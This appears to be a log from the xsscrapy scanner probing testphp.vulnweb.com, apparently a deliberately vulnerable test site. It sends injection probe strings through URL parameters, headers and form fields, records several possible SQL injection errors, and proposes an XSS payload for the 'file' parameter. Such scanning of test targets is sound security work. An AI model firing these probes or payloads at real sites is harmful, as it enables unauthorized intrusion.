+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: 	error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ''"(){}<x>:/1zqjhc;9' at line 1
+2022-06-21 14:33:15 [xsscrapy] INFO:     Fout: Payload delims do not surround this injection point. Found via search for entire payload.
+2022-06-21 14:33:15 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/listproducts.php?cat=1zqjhc'%22()%7B%7D%3Cx%3E:/1zqjhc;9>
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/product.php/1zqjpq'%22()%7B%7D%3Cx%3E:1zqjpq;9/?pic=5> (referer: http://testphp.vulnweb.com/product.php?pic=5)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1zqjdf'%22()%7B%7D%3Cx%3E:/1zqjdf;9> (referer: http://testphp.vulnweb.com/product.php?pic=5)
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=2. type = header, cookie
+
+
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php/1zqjbr'%22()%7B%7D%3Cx%3E:1zqjbr;9/?file=./pictures/3.jpg
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/product.php/1zqjug'%22()%7B%7D%3Cx%3E:1zqjug;9/?pic=4> (referer: http://testphp.vulnweb.com/product.php?pic=4)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php?file=1zqjwz'%22()%7B%7D%3Cx%3E:/1zqjwz;9
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=2. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=3. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/product.php/1zqjkj'%22()%7B%7D%3Cx%3E:1zqjkj;9/?pic=3> (referer: http://testphp.vulnweb.com/product.php?pic=3)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=3. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1zqjak'%22()%7B%7D%3Cx%3E:/1zqjak;9> (referer: http://testphp.vulnweb.com/product.php?pic=3)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/product.php/1zqjpq'%22()%7B%7D%3Cx%3E:1zqjpq;9/?pic=5>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=3> (referer: http://testphp.vulnweb.com/product.php?pic=3)
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/product.php?pic=5
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/product.php?pic=1zqjdf'%22()%7B%7D%3Cx%3E:/1zqjdf;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjdf'"(){}<x>:/1zqjdf;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: pic
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1zqjdf'%22()%7B%7D%3Cx%3E:/1zqjdf;9. type = url, pic
+
+
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/product.php?pic=1zqjqm'%22()%7B%7D%3Cx%3E:/1zqjqm;9
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/product.php/1zqjxz'%22()%7B%7D%3Cx%3E:1zqjxz;9/?pic=2> (referer: http://testphp.vulnweb.com/product.php?pic=2)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/product.php/1zqjug'%22()%7B%7D%3Cx%3E:1zqjug;9/?pic=4>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1zqjtk'%22()%7B%7D%3Cx%3E:/1zqjtk;9> (referer: http://testphp.vulnweb.com/product.php?pic=2)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/showimage.php/1zqjec'%22()%7B%7D%3Cx%3E:1zqjec;9/?file=./pictures/1.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg)
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/product.php/1zqjkj'%22()%7B%7D%3Cx%3E:1zqjkj;9/?pic=3>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php/1zqjci'%22()%7B%7D%3Cx%3E:1zqjci;9/?file=./pictures/4.jpg
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=1zqjys'%22()%7B%7D%3Cx%3E:/1zqjys;9> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/showimage.php?file=1zqjio'%22()%7B%7D%3Cx%3E:/1zqjio;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/product.php?pic=3
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/product.php?pic=1zqjak'%22()%7B%7D%3Cx%3E:/1zqjak;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjak'"(){}<x>:/1zqjak;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: pic
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1zqjak'%22()%7B%7D%3Cx%3E:/1zqjak;9. type = url, pic
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=3. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/product.php/1zqjxz'%22()%7B%7D%3Cx%3E:1zqjxz;9/?pic=2>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg> (referer: 1zqjsj'"(){}<x>:/1zqjsj;9)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/product.php?pic=2
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/product.php?pic=1zqjtk'%22()%7B%7D%3Cx%3E:/1zqjtk;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjtk'"(){}<x>:/1zqjtk;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: pic
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1zqjtk'%22()%7B%7D%3Cx%3E:/1zqjtk;9. type = url, pic
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/product.php/1zqjjf'%22()%7B%7D%3Cx%3E:1zqjjf;9/?pic=1> (referer: http://testphp.vulnweb.com/product.php?pic=1)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/showimage.php/1zqjec'%22()%7B%7D%3Cx%3E:1zqjec;9/?file=./pictures/1.jpg>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1zqjzx'%22()%7B%7D%3Cx%3E:/1zqjzx;9> (referer: http://testphp.vulnweb.com/product.php?pic=1)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/showimage.php?file=1zqjys'%22()%7B%7D%3Cx%3E:/1zqjys;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjys'"(){}<x>:/1zqjys;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: file
+2022-06-21 14:33:15 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: <p
+warning: fopen(1zqjys'"(){}<x>:/1zqjys;9
+2022-06-21 14:33:15 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/showimage.php?file=1zqjys'%22()%7B%7D%3Cx%3E:/1zqjys;9>
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1> (referer: http://testphp.vulnweb.com/product.php?pic=1)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjbx'%22()%7B%7D%3Cx%3E:/1zqjbx;9
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1> (referer: 1zqjdr'"(){}<x>:/1zqjdr;9)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/showimage.php/1zqjzh'%22()%7B%7D%3Cx%3E:1zqjzh;9/?file=./pictures/5.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=1zqjtm'%22()%7B%7D%3Cx%3E:/1zqjtm;9> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded form param uuname to: http://testphp.vulnweb.com/secured/newuser.php
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/product.php/1zqjjf'%22()%7B%7D%3Cx%3E:1zqjjf;9/?pic=1>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/product.php?pic=1
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/product.php?pic=1zqjzx'%22()%7B%7D%3Cx%3E:/1zqjzx;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjzx'"(){}<x>:/1zqjzx;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: pic
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1zqjzx'%22()%7B%7D%3Cx%3E:/1zqjzx;9. type = url, pic
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg> (referer: 1zqjfp'"(){}<x>:/1zqjfp;9)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/showimage.php/1zqjzh'%22()%7B%7D%3Cx%3E:1zqjzh;9/?file=./pictures/5.jpg>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=2> (referer: http://testphp.vulnweb.com/product.php?pic=2)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/showimage.php?file=1zqjtm'%22()%7B%7D%3Cx%3E:/1zqjtm;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjtm'"(){}<x>:/1zqjtm;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: file
+2022-06-21 14:33:15 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: <p
+warning: fopen(1zqjtm'"(){}<x>:/1zqjtm;9
+2022-06-21 14:33:15 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/showimage.php?file=1zqjtm'%22()%7B%7D%3Cx%3E:/1zqjtm;9>
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=2> (referer: 1zqjcb'"(){}<x>:/1zqjcb;9)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/showimage.php/1zqjvu'%22()%7B%7D%3Cx%3E:1zqjvu;9/?file=./pictures/2.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg)
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=1zqjij'%22()%7B%7D%3Cx%3E:/1zqjij;9> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/artists.php/1zqjod'%22()%7B%7D%3Cx%3E:1zqjod;9
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg> (referer: 1zqjpn'"(){}<x>:/1zqjpn;9)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=2. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=3> (referer: 1zqjml'"(){}<x>:/1zqjml;9)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=2. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/showimage.php/1zqjvu'%22()%7B%7D%3Cx%3E:1zqjvu;9/?file=./pictures/2.jpg>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/showimage.php?file=1zqjij'%22()%7B%7D%3Cx%3E:/1zqjij;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjij'"(){}<x>:/1zqjij;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: file
+2022-06-21 14:33:15 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: <p
+warning: fopen(1zqjij'"(){}<x>:/1zqjij;9
+2022-06-21 14:33:15 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/showimage.php?file=1zqjij'%22()%7B%7D%3Cx%3E:/1zqjij;9>
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/product.php/1zqjck'%22()%7B%7D%3Cx%3E:1zqjck;9/?pic=6> (referer: http://testphp.vulnweb.com/product.php?pic=6)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1zqjxd'%22()%7B%7D%3Cx%3E:/1zqjxd;9> (referer: http://testphp.vulnweb.com/product.php?pic=6)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded form param uname to: http://testphp.vulnweb.com/userinfo.php
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=6> (referer: http://testphp.vulnweb.com/product.php?pic=6)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=6> (referer: 1zqjdp'"(){}<x>:/1zqjdp;9)
+2022-06-21 14:33:15 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=3. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=1zqjwz'%22()%7B%7D%3Cx%3E:/1zqjwz;9> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/showimage.php/1zqjbr'%22()%7B%7D%3Cx%3E:1zqjbr;9/?file=./pictures/3.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg)
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/product.php/1zqjck'%22()%7B%7D%3Cx%3E:1zqjck;9/?pic=6>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg> (referer: 1zqjcw'"(){}<x>:/1zqjcw;9)
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/product.php?pic=6
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/product.php?pic=1zqjxd'%22()%7B%7D%3Cx%3E:/1zqjxd;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjxd'"(){}<x>:/1zqjxd;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: pic
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1zqjxd'%22()%7B%7D%3Cx%3E:/1zqjxd;9. type = url, pic
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=6. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=6. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/showimage.php/1zqjbr'%22()%7B%7D%3Cx%3E:1zqjbr;9/?file=./pictures/3.jpg>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:15 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
+2022-06-21 14:33:15 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/showimage.php?file=1zqjwz'%22()%7B%7D%3Cx%3E:/1zqjwz;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:15 [xsscrapy] INFO:     Payload: 1zqjwz'"(){}<x>:/1zqjwz;9
+2022-06-21 14:33:15 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:15 [xsscrapy] INFO:     Injectiepunten: file
+2022-06-21 14:33:15 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:15 [xsscrapy] INFO:     Line: <p
+warning: fopen(1zqjwz'"(){}<x>:/1zqjwz;9
+2022-06-21 14:33:15 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/showimage.php?file=1zqjwz'%22()%7B%7D%3Cx%3E:/1zqjwz;9>
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg. type = header, cookie
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=4> (referer: 1zqjjz'"(){}<x>:/1zqjjz;9)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=4> (referer: http://testphp.vulnweb.com/product.php?pic=4)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=1zqjqm'%22()%7B%7D%3Cx%3E:/1zqjqm;9> (referer: http://testphp.vulnweb.com/product.php?pic=4)
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/showimage.php/1zqjci'%22()%7B%7D%3Cx%3E:1zqjci;9/?file=./pictures/4.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=1zqjio'%22()%7B%7D%3Cx%3E:/1zqjio;9> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg> (referer: 1zqjky'"(){}<x>:/1zqjky;9)
+2022-06-21 14:33:15 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg> (referer: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg)
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=4. type = header, Referer
+
+
+2022-06-21 14:33:15 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=4. type = header, cookie
+
+
+2022-06-21 14:33:16 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/product.php?pic=4
+2022-06-21 14:33:16 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/product.php?pic=1zqjqm'%22()%7B%7D%3Cx%3E:/1zqjqm;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:16 [xsscrapy] INFO:     Payload: 1zqjqm'"(){}<x>:/1zqjqm;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:16 [xsscrapy] INFO:     Injectiepunten: pic
+2022-06-21 14:33:16 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=1zqjqm'%22()%7B%7D%3Cx%3E:/1zqjqm;9. type = url, pic
+
+
